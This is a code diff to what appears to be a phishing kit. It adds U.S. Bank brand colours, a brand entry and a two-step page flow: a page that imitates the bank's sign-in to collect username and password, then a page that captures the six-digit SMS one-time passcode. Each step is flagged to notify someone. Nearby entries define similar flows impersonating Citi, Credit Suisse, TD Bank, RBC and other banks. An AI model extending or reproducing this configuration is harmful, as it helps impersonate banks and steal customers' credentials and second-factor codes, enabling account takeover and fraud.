@@ -81,6 +81,7 @@ const PALETTES = {
   creditsuisse:   ['#006498','#004A72','#FFFFFF','#006498','#E4002B'],
   tdbank:         ['#00B140','#008A30','#FFFFFF','#00B140','#009431'],
   rbc:            ['#005DAA','#003F7A','#FFFFFF','#005DAA','#FECB00'],
+  usbank:         ['#CC0000','#A00000','#FFFFFF','#CC0000','#0D2481'],
   santander:      ['#EC0000','#B50000','#FFFFFF','#EC0000','#000000'],
   bbva:           ['#004481','#003060','#FFFFFF','#004481','#049FD4'],
   ing:            ['#FF6200','#D94F00','#FFFFFF','#FF6200','#FF6200'],
@@ -465,6 +466,11 @@ const FLOWS = {
     { slug:'confirm-account', form_type:'verify', page_title:'Confirm Account',   headline:'Confirm Your Account Number',         subheadline:'Enter the last 4 digits of your bank account number', fields:['account_last4'],             layout:'verify',cta:'Confirm',     step_label:'Confirm Account',notify_step:true  }
   ],
 
+  usbank: [
+    { slug:'login',    form_type:'login', page_title:'Sign In', headline:'Sign in to U.S. Bank', subheadline:'Enter your personal ID and passcode', fields:['username','password'], layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'sms-otp',  form_type:'otp',   page_title:'Verification', headline:'Verify Your Identity', subheadline:'Enter the one-time passcode sent to your phone', fields:['code'], layout:'otp', cta:'Continue', step_label:'OTP', notify_step:true, otp_length:6 }
+  ],
+
   citibank: [
     { slug:'login',      form_type:'login',      page_title:'Sign In',           headline:'Sign in to Citi',                    subheadline:'Enter your user ID and password',         fields:['user_id','password'],        layout:'auth',      cta:'Sign In',   step_label:'Login',            notify_step:true  },
     { slug:'sms-otp',    form_type:'otp',        page_title:'Verification',      headline:'Enter Verification Code',             subheadline:'We sent a code via SMS',                  fields:['code'],                      layout:'otp',       cta:'Confirm',   step_label:'SMS OTP',          notify_step:true,  otp_length:6 },
@@ -804,6 +810,7 @@ const BRANDS = [
   ['t052','Credit Suisse','banks','creditsuisse'],
   ['t053','TD Bank','banks','tdbank'],
   ['t054','RBC','banks','rbc'],
+  ['t054b','US Bank','banks','usbank'],
   ['t055','Santander','banks','santander'],
   ['t056','BBVA','banks','bbva'],
   ['t057','ING','banks','ing'],
